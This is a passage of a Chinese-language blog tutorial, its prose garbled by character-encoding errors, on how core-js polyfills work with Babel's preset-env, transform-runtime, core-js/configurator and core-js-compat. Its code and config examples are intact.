<pre><code class="hljs language-js" lang="js"><span class="hljs-meta">"use strict"</span>;

<span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js'</span>);
<span class="hljs-keyword">const</span> jzplp = <span class="hljs-number">1</span>;
</code></pre>
<h3 data-id="heading-15">preset-envé…ç½®entry</h3>
<p>@babel/preset-envæ˜¯ä¸€ä¸ªBabelé¢„è®¾ï¼Œå¯ä»¥æ ¹æ®é…ç½®ä¸ºä»£ç å¢åŠ å…¼å®¹æ€§å¤„ç†ã€‚å‰é¢åˆ›å»ºBabelç¤ºä¾‹æ—¶å·²ç»å¢åŠ äº†è¿™ä¸ªé¢„è®¾ï¼Œä½†æ˜¯æ²¡æœ‰å¢åŠ core-jsé…ç½®ã€‚è¿™é‡Œæˆ‘ä»¬åŠ ä¸€ä¸‹ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"presets"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"@babel/preset-env"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"targets"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
          <span class="hljs-attr">"chrome"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"100"</span>
        <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"useBuiltIns"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"entry"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"corejs"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"3.47.0"</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>è¿™é‡Œå¢åŠ äº†corejsç‰ˆæœ¬å’ŒuseBuiltInsé…ç½®ï¼Œå€¼ä¸ºentryã€‚é…ç½®è¿™ä¸ªå€¼ï¼Œä¼šä½¿å¾—@babel/preset-envæ ¹æ®é…ç½®çš„æµè§ˆå™¨ç‰ˆæœ¬å…¼å®¹æ€§ï¼Œé€‰æ‹©å¼•å…¥å“ªäº›core-jsä¸­çš„ç‰¹æ€§ã€‚è¿™é‡Œå†æ‰§è¡Œå‘½ä»¤è¡Œï¼Œç»“æœå¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-meta">"use strict"</span>;

<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/es.symbol.async-dispose.js"</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/es.symbol.dispose.js"</span>);
<span class="hljs-comment">// ... æ›´å¤šesç‰¹æ€§çœç•¥</span>
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/esnext.array.filter-out.js"</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/esnext.array.filter-reject.js"</span>);
<span class="hljs-comment">// ... æ›´å¤šesnextç‰¹æ€§çœç•¥</span>
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/web.dom-exception.stack.js"</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/web.immediate.js"</span>);
<span class="hljs-comment">// ... æ›´å¤šwebç‰¹æ€§çœç•¥</span>
<span class="hljs-keyword">const</span> jzplp = <span class="hljs-number">1</span>;
</code></pre>
<p>å¯ä»¥çœ‹åˆ°core-jsè¢«æ‹†å¼€ï¼Œç›´æ¥å¼•å…¥äº†ç‰¹æ€§æœ¬èº«ã€‚åœ¨é…ç½®chrome: 100ç‰ˆæœ¬æ—¶ï¼Œå¼•å…¥çš„ç‰¹æ€§ä¸º215ä¸ªã€‚æˆ‘ä»¬ä¿®æ”¹é…ç½®chrome: 140ç‰ˆæœ¬æ—¶ï¼Œå†é‡æ–°ç”Ÿæˆä»£ç ï¼Œæ­¤æ—¶å¼•å…¥çš„ç‰¹æ€§ä¸º150ä¸ªã€‚å¯ä»¥çœ‹åˆ°ç¡®å®æ—¶æ ¹æ®æµè§ˆå™¨ç‰ˆæœ¬é€‰æ‹©ä¸åŒçš„ç‰¹æ€§å¼•å…¥ã€‚è¿™å¯¹äºå…¶å®ƒcore-jsçš„å¼•å…¥æ–¹å¼ä¹Ÿç”Ÿæ•ˆï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// æºä»£ç </span>
<span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js/stable'</span>);
<span class="hljs-keyword">const</span> jzplp = <span class="hljs-number">1</span>;

<span class="hljs-comment">// ç”Ÿæˆä»£ç </span>
<span class="hljs-meta">"use strict"</span>;

<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/es.symbol.async-dispose.js"</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/es.symbol.dispose.js"</span>);
<span class="hljs-comment">// ... æ›´å¤šesç‰¹æ€§çœç•¥</span>
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/web.dom-exception.stack.js"</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/web.immediate.js"</span>);
<span class="hljs-comment">// ... æ›´å¤šwebç‰¹æ€§çœç•¥</span>
<span class="hljs-keyword">const</span> jzplp = <span class="hljs-number">1</span>;
</code></pre>
<p>æˆ‘ä»¬å¼•å…¥core-js/stableï¼Œå¯ä»¥çœ‹åˆ°ç”Ÿæˆä»£ç ä¸­ä¸å¼•å…¥esnextç‰¹æ€§äº†ã€‚åœ¨é…ç½®chrome: 100ç‰ˆæœ¬æ—¶ï¼Œå¼•å…¥çš„ç‰¹æ€§ä¸º71ä¸ªï¼Œé…ç½®chrome: 100ç‰ˆæœ¬æ—¶ï¼Œå¼•å…¥çš„ç‰¹æ€§ä¸º6ä¸ªã€‚åŒæ ·çš„ï¼Œå¦‚æœå¼•å…¥æ¢æˆcore-js/full/arrayï¼Œå°±ä¼šåªå¼•å…¥æ•°ç»„ç›¸å…³ç‰¹æ€§ï¼Œè€Œä¸”ä¹Ÿæ˜¯æ ¹æ®æµè§ˆå™¨å…¼å®¹ç‰ˆæœ¬å¼•å…¥ã€‚</p>
<h3 data-id="heading-16">preset-envé…ç½®usage</h3>
<p>@babel/preset-envçš„useBuiltInsé…ç½®å€¼ä¸ºusageæ—¶ï¼ŒBabelä¸ä»…ä¼šè·Ÿæ ¹æ®é…ç½®çš„æµè§ˆå™¨ç‰ˆæœ¬å…¼å®¹æ€§ï¼Œè¿˜ä¼šæ ¹æ®ä»£ç ä¸­å®é™…ä½¿ç”¨çš„ç‰¹æ€§æ¥é€‰æ‹©å¼•å…¥å“ªäº›core-jsä¸­çš„ç‰¹æ€§ã€‚é¦–å…ˆæ˜¯Babelé…ç½®ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"presets"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"@babel/preset-env"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"targets"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
          <span class="hljs-attr">"chrome"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"100"</span>
        <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"useBuiltIns"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"usage"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"corejs"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"3.47.0"</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>ç„¶åæ˜¯è¦å¤„ç†çš„ä»£ç ï¼Œæ³¨æ„é…ç½®usageæ—¶æ˜¯ä¸éœ€è¦æ‰‹åŠ¨å¼•å…¥core-jsçš„ã€‚æˆ‘ä»¬é…ç½®ä¸åŒçš„Chromeæµè§ˆå™¨ç‰ˆæœ¬ï¼Œçœ‹çœ‹è¾“å‡ºç»“æœå¦‚ä½•ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// æºä»£ç </span>
<span class="hljs-keyword">const</span> jzplp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>();
<span class="hljs-keyword">const</span> b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();

<span class="hljs-comment">// chrome 50 ç”Ÿæˆä»£ç  </span>
<span class="hljs-meta">"use strict"</span>;

<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/es.array.iterator.js"</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/es.map.js"</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/es.promise.js"</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/web.dom-collections.iterator.js"</span>);
<span class="hljs-keyword">const</span> jzplp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>();
<span class="hljs-keyword">const</span> b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();

<span class="hljs-comment">// chrome 100 ç”Ÿæˆä»£ç  </span>
<span class="hljs-meta">"use strict"</span>;

<span class="hljs-keyword">const</span> jzplp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>();
<span class="hljs-keyword">const</span> b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
</code></pre>
<p>é¦–å…ˆå¯ä»¥çœ‹åˆ°ï¼Œå¼•å…¥core-jsä¸­çš„ç‰¹æ€§æ•°é‡å˜å¾—éå¸¸å°‘äº†ï¼Œä»£ç ä¸­æ²¡æœ‰ç”¨åˆ°çš„ç‰¹æ€§ä¸å†å¼•å…¥ã€‚å…¶æ¬¡ä¸åŒçš„æµè§ˆå™¨ç‰ˆæœ¬å¼•å…¥çš„ç‰¹æ€§ä¸ä¸€æ ·ï¼Œå› æ­¤è¿˜æ˜¯ä¼šæ ¹æ®æµè§ˆå™¨å…¼å®¹æ€§å¼•å…¥ç‰¹æ€§ã€‚æˆ‘ä»¬å†ä¿®æ”¹ä¸€ä¸‹æºä»£ç è¯•è¯•ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// æºä»£ç </span>
<span class="hljs-keyword">const</span> jzplp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>();
<span class="hljs-keyword">const</span> b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span>{});

<span class="hljs-comment">// chrome 50 ç”Ÿæˆä»£ç  </span>
<span class="hljs-meta">"use strict"</span>;

<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/es.array.iterator.js"</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/es.map.js"</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/es.promise.js"</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/es.promise.try.js"</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/web.dom-collections.iterator.js"</span>);
<span class="hljs-keyword">const</span> jzplp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>();
<span class="hljs-keyword">const</span> b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {});

<span class="hljs-comment">// chrome 100 ç”Ÿæˆä»£ç  </span>
<span class="hljs-meta">"use strict"</span>;

<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/es.promise.try.js"</span>);
<span class="hljs-keyword">const</span> jzplp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>();
<span class="hljs-keyword">const</span> b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {});
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼Œæºä»£ç ä¸­å¢åŠ äº†Promise.tryï¼Œå¼•å…¥çš„ç‰¹æ€§ä¹Ÿéšä¹‹å¢åŠ äº†å¯¹åº”çš„core-jsç‰¹æ€§å¼•å…¥ã€‚å› æ­¤ï¼Œä½¿ç”¨@babel/preset-envçš„usageé…ç½®ï¼Œå¯ä»¥ä¿è¯å…¼å®¹æ€§çš„åŒæ—¶ï¼Œæœ€å°åŒ–å¼•å…¥core-jsç‰¹æ€§ã€‚å¦å¤–è¿™ä¸ªé…ç½®å¹¶ä¸ä¼šè‡ªåŠ¨å¼•å…¥æè®®ç‰¹æ€§ï¼Œå¦‚æœéœ€è¦åˆ™é¢å¤–é…ç½®proposalsä¸ºtrueã€‚</p>
<h3 data-id="heading-17">@babel/polyfill</h3>
<p>@babel/polyfillæ˜¯ä¸€ä¸ªå·²ç»è¢«å¼ƒç”¨çš„åŒ…ï¼Œæ¨èç›´æ¥ä½¿ç”¨core-js/stableã€‚æŸ¥çœ‹@babel/polyfillæºç ï¼Œå‘ç°ä»–å°±æ˜¯å¼•å…¥äº†core-jsç‰¹æ€§ä¸regenerator-runtimeè¿™ä¸ªåŒ…ã€‚regenerator-runtimeä¹Ÿæ˜¯ä¸€ä¸ªå…¼å®¹æ€§ç›¸å…³çš„åŒ…ï¼Œå¯ä»¥å¸®åŠ©æ·»åŠ generatoreå’Œasync/awaitç›¸å…³è¯­æ³•ã€‚ä½œä¸ºæ›¿ä»£å¯ä»¥è¿™æ ·å¼•å…¥ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> <span class="hljs-string">'core-js/stable'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'regenerator-runtime/runtime'</span>;
</code></pre>
<h3 data-id="heading-18">@babel/runtime</h3>
<p>@babel/runtimeå°±åƒè‡ªåŠ¨å¼•å…¥ç‰ˆçš„core-js-pureã€‚å®ƒè¿˜æ˜¯æ ¹æ®ä»£ç å®é™…ä½¿ç”¨çš„ç‰¹æ€§æ¥æ³¨å…¥core-jsç‰¹æ€§ï¼Œä½†å®ƒä¸æ³¨å…¥åˆ°å…¨å±€ï¼Œè€Œæ˜¯å¼•å…¥è¿™äº›APIå†è°ƒç”¨ã€‚è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨@babel/plugin-transform-runtimeæ’ä»¶ï¼Œé‡Œé¢åŒ…å«äº†@babel/runtimeç›¸å…³é€»è¾‘ã€‚é¦–å…ˆçœ‹ä¸‹Babelé…ç½®ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"plugins"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">[</span><span class="hljs-string">"@babel/plugin-transform-runtime"</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"corejs"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>å†è½¬ä¹‰ä¸Šä¸€èŠ‚ä¸­çš„ä»£ç ï¼Œç»“æœå¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// æºä»£ç </span>
<span class="hljs-keyword">const</span> jzplp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>();
<span class="hljs-keyword">const</span> b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span>{});

<span class="hljs-comment">// ç”Ÿæˆä»£ç </span>
<span class="hljs-keyword">import</span> _Promise <span class="hljs-keyword">from</span> <span class="hljs-string">"@babel/runtime-corejs3/core-js-stable/promise"</span>;
<span class="hljs-keyword">import</span> _Map <span class="hljs-keyword">from</span> <span class="hljs-string">"@babel/runtime-corejs3/core-js-stable/map"</span>;
<span class="hljs-keyword">const</span> jzplp = <span class="hljs-keyword">new</span> <span class="hljs-title function_">_Promise</span>();
<span class="hljs-keyword">const</span> b = <span class="hljs-keyword">new</span> <span class="hljs-title function_">_Map</span>();
_Promise.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {});
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼Œè™½ç„¶æ²¡æœ‰ç›´æ¥å¼•å…¥core-js-pureï¼Œä½†æ•ˆæœæ˜¯ä¸€æ ·çš„ã€‚æ‰“å¼€@babel/runtime-corejs3è¿™ä¸ªåŒ…æŸ¥çœ‹ï¼Œé‡Œé¢å®é™…ä¸Šå°±æ˜¯å¯¼å‡ºäº†core-js-pureä¸­çš„ç‰¹æ€§ã€‚ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// @babel/runtime-corejs3/core-js-stable/map.js æ–‡ä»¶å†…å®¹</span>
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js-pure/stable/map"</span>);
</code></pre>
<h2 data-id="heading-19">core-js/configuratorå¼ºåˆ¶æ§åˆ¶</h2>
<p>å¦‚æœå¸Œæœ›åœ¨æ­£å¸¸å¼•å…¥core-jsæ—¶ï¼Œå¯¹äºéƒ¨åˆ†ç‰¹æ®Šå±æ€§è¿›è¡Œå¼•å…¥æˆ–è€…ä¸å¼•å…¥çš„æ§åˆ¶ï¼Œå°±éœ€è¦ç”¨åˆ°core-js/configuratorã€‚è¿™ä¸ªå·¥å…·å¯ä»¥é…ç½®ä¸‰ç§é€‰é¡¹ï¼š</p>
<ul>
<li>useNative: å½“ç¯å¢ƒä¸­æœ‰è¿™ä¸ªç‰¹æ€§æ—¶ä¸å¼•å…¥ï¼Œå½“ç¡®å®šæ²¡æœ‰æ—¶æ‰å¼•å…¥</li>
<li>usePolyfill: æ˜ç¡®å¼•å…¥è¿™ä¸ªç‰¹æ€§</li>
<li>useFeatureDetection: é»˜è®¤è¡Œä¸ºï¼Œå’Œä¸ä½¿ç”¨core-js/configuratorä¸€è‡´</li>
</ul>
<h3 data-id="heading-20">useNativeä¸å¼•å…¥</h3>
<p>é¦–å…ˆè¯•è¯•ä¸å¼•å…¥ç‰¹æ€§ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨Promiseè¿™ä¸ªç‰¹æ€§ä¸ºä¾‹ã€‚é¦–å…ˆæ˜¯ä¸å¼•å…¥core-jsçš„æ•ˆæœï¼Œå¯ä»¥çœ‹åˆ°å…¨å±€Promiseå¯¹è±¡è¢«æˆ‘ä»¬æ”¹æ‰äº†ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> jzplp = {};
<span class="hljs-title class_">Promise</span> = jzplp;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Promise</span>, <span class="hljs-title class_">Promise</span> === jzplp);

<span class="hljs-comment">/* è¾“å‡ºç»“æœ
{} true
*/</span>
</code></pre>
<p>ç„¶ååœ¨ä¸­é—´å¼•å…¥core-jsè¯•è¯•ã€‚å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æ”¹æ‰çš„Promiseï¼Œè¢«core-jsç»™æ”¹å›å»äº†ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> jzplp = {};
<span class="hljs-title class_">Promise</span> = jzplp;
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/actual"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Promise</span>, <span class="hljs-title class_">Promise</span> === jzplp);

<span class="hljs-comment">/* è¾“å‡ºç»“æœ
[Function: Promise] false
*/</span>
</code></pre>
<p>è¿™æ—¶å€™ï¼Œå¦‚æœä¸å¸Œæœ›core-jsæ”¹æ‰æˆ‘ä»¬è‡ªå®šä¹‰çš„Promiseï¼Œå¯ä»¥åˆ©ç”¨useNativeé…ç½®ï¼Œå¼ºåˆ¶core-jsä¸å¼•å…¥è¿™ä¸ªç‰¹æ€§ã€‚çœ‹ç»“æœcore-jså¼•å…¥ä¹‹åï¼Œæˆ‘ä»¬è‡ªå®šä¹‰çš„Promiseä¾ç„¶å­˜åœ¨ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> configurator = <span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/configurator"</span>);
<span class="hljs-title function_">configurator</span>({
  <span class="hljs-attr">useNative</span>: [<span class="hljs-string">"Promise"</span>],
});
<span class="hljs-keyword">const</span> jzplp = {};
<span class="hljs-title class_">Promise</span> = jzplp;
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/actual"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Promise</span>, <span class="hljs-title class_">Promise</span> === jzplp);

<span class="hljs-comment">/* è¾“å‡ºç»“æœ
{} true
*/</span>
</code></pre>
<h3 data-id="heading-21">usePolyfillå¼ºåˆ¶å¼•å…¥</h3>
<p>æƒ³è¦éªŒè¯usePolyfillçš„æ•ˆæœï¼Œéœ€è¦æ‰¾ä¸€ä¸ªç¯å¢ƒä¸­æœ¬æ¥å­˜åœ¨çš„ç‰¹æ€§ï¼Œcore-jså³ä½¿å¼•å…¥ä¹Ÿä¸ä¼šä¿®æ”¹çš„ç‰¹æ€§ã€‚Promiseä¸è¡Œï¼Œå› ä¸ºcore-jså¼•å…¥æ—¶ä¼šå¯¹è¿™ä¸ªPromiseå¢åŠ å­ç‰¹æ€§ã€‚Promise.tryä¹Ÿä¸è¡Œï¼Œå› ä¸ºåŸæ¥ç¯å¢ƒä¸­ä¸å­˜åœ¨ã€‚è¿™é‡Œè¯•ä¸€ä¸‹Promise.anyï¼Œè¿™æ˜¯ç¯å¢ƒä¸­æœ¬æ¥å°±å­˜åœ¨çš„ç‰¹æ€§ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Promise</span>.<span class="hljs-property">any</span>);
<span class="hljs-keyword">const</span> <span class="hljs-title function_">jzplp</span> = (<span class="hljs-params"/>) =&gt; {};
<span class="hljs-title class_">Promise</span>.<span class="hljs-property">any</span> = jzplp;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Promise</span>.<span class="hljs-property">any</span>, <span class="hljs-title class_">Promise</span>.<span class="hljs-property">any</span> === jzplp);

<span class="hljs-comment">/* è¾“å‡ºç»“æœ
[Function: any]
[Function: jzplp] true
*/</span>
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼ŒPromise.anyåŸæ¥å°±å­˜åœ¨ï¼Œä½†æ˜¯è¢«æˆ‘ä»¬ä¿®æ”¹æˆäº†æ–°å‡½æ•°ã€‚å†å¼•å…¥core-jsè¯•è¯•ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Promise</span>.<span class="hljs-property">any</span>);
<span class="hljs-keyword">const</span> <span class="hljs-title function_">jzplp</span> = (<span class="hljs-params"/>) =&gt; {};
<span class="hljs-title class_">Promise</span>.<span class="hljs-property">any</span> = jzplp;
<span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Promise</span>.<span class="hljs-property">any</span>, <span class="hljs-title class_">Promise</span>.<span class="hljs-property">any</span> === jzplp);

<span class="hljs-comment">/* è¾“å‡ºç»“æœ
[Function: any]
[Function: jzplp] true
*/</span>
</code></pre>
<p>å¼•å…¥äº†core-jsä¹‹åï¼Œç»“æœæ²¡æœ‰å˜åŒ–ã€‚è¿™è¯´æ˜core-jså¹¶ä¸ä¼šä¿®æ”¹æˆ‘ä»¬è‡ªå®šä¹‰çš„å‡½æ•°ã€‚è¿™æ—¶å€™å°±å¯ä»¥è¯•ä¸€ä¸‹usePolyfillçš„æ•ˆæœäº†ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> configurator = <span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/configurator"</span>);
<span class="hljs-title function_">configurator</span>({
  <span class="hljs-attr">usePolyfill</span>: [<span class="hljs-string">"Promise.any"</span>],
});
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Promise</span>.<span class="hljs-property">any</span>);
<span class="hljs-keyword">const</span> <span class="hljs-title function_">jzplp</span> = (<span class="hljs-params"/>) =&gt; {};
<span class="hljs-title class_">Promise</span>.<span class="hljs-property">any</span> = jzplp;
<span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Promise</span>.<span class="hljs-property">any</span>, <span class="hljs-title class_">Promise</span>.<span class="hljs-property">any</span> === jzplp);

<span class="hljs-comment">/* è¾“å‡ºç»“æœ
[Function: any]
[Function: any] false
*/</span>
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼ŒPromise.anyåˆè¢«æ”¹ä¸ºäº†çœŸæ­£èµ·æ•ˆæœçš„å‡½æ•°ï¼Œè¿™è¯´æ˜usePolyfillçš„å¼ºåˆ¶å¼•å…¥ç‰¹æ€§æ˜¯æœ‰æ•ˆçš„ã€‚</p>
<h2 data-id="heading-22">core-jsä¸­çš„ç‰¹æ€§é€‰æ‹©</h2>
<p>å‰é¢æˆ‘ä»¬ä½“éªŒäº†Babelæ ¹æ®æµè§ˆå™¨å…¼å®¹æ€§ï¼Œé€‰æ‹©ä¸åŒçš„core-jsç‰¹æ€§å¼•å…¥ï¼Œé‚£ä¹ˆä¸åŒæµè§ˆå™¨å…¼å®¹å“ªäº›ç‰¹æ€§çš„æ•°æ®æ˜¯ä»å“ªé‡Œè·å–å‘¢ï¼Ÿcore-jsæœ¬èº«å°±æä¾›äº†è¿™ä¸ªåŠŸèƒ½ã€‚</p>
<h3 data-id="heading-23">core-js-compat</h3>
<p>core-js-compatæä¾›äº†ä¸åŒæµè§ˆå™¨å¯¹åº”ç‰¹æ€§çš„å…¼å®¹æ€§æ•°æ®ã€‚å®ƒæœ‰å¥½å‡ ä¸ªå‚æ•°ï¼Œè¿™é‡Œå…ˆåˆ—ä¸¾ä¸€ä¸‹å«ä¹‰ï¼š</p>
<ul>
<li>targets: Browserslistæ ¼å¼çš„æµè§ˆå™¨å…¼å®¹é…ç½®</li>
<li>modules: éœ€è¦è®¾ç½®å…¼å®¹æ€§é…ç½®çš„æ¨¡å—ï¼Œå¯ä»¥æ˜¯core-js/fullï¼Œä¹Ÿå¯ä»¥æ˜¯æŸä¸ªç‰¹æ€§ï¼Œç”šè‡³æ˜¯æ­£åˆ™</li>
<li>exclude: éœ€è¦æ’é™¤çš„æ¨¡å—</li>
<li>version: ä½¿ç”¨çš„core-jsç‰ˆæœ¬</li>
<li>inverse: åå‘è¾“å‡ºï¼Œå³è¾“å‡ºä¸éœ€è¦å…¼å®¹çš„ç‰¹æ€§åˆ—è¡¨</li>
</ul>
<p>è¿™é‡Œä¸¾å‡ ä¸ªä¾‹å­è¯•ä¸€ä¸‹ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> compat = <span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js-compat"</span>);
<span class="hljs-keyword">const</span> data = <span class="hljs-title function_">compat</span>({
  <span class="hljs-attr">targets</span>: <span class="hljs-string">"&gt; 10%"</span>,
  <span class="hljs-attr">modules</span>: [<span class="hljs-string">"core-js/actual"</span>],
  <span class="hljs-attr">version</span>: <span class="hljs-string">"3.47"</span>,
});
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);

<span class="hljs-comment">/* è¾“å‡ºç»“æœ
{
  list: [
    'es.iterator.concat',
    'es.math.sum-precise',
    'es.async-iterator.async-dispose',
    'esnext.array.group',
    'esnext.array.group-by',
    ...å…¶å®ƒç‰¹æ€§
  ],
  targets: {
    'es.iterator.concat': { 'chrome-android': '143' },
    'es.math.sum-precise': { 'chrome-android': '143' },
    'es.async-iterator.async-dispose': { 'chrome-android': '143' },
    'esnext.array.group': { 'chrome-android': '143' },
    'esnext.array.group-by': { 'chrome-android': '143' },
    ...å…¶å®ƒç‰¹æ€§
  }
}
*/</span>
</code></pre>
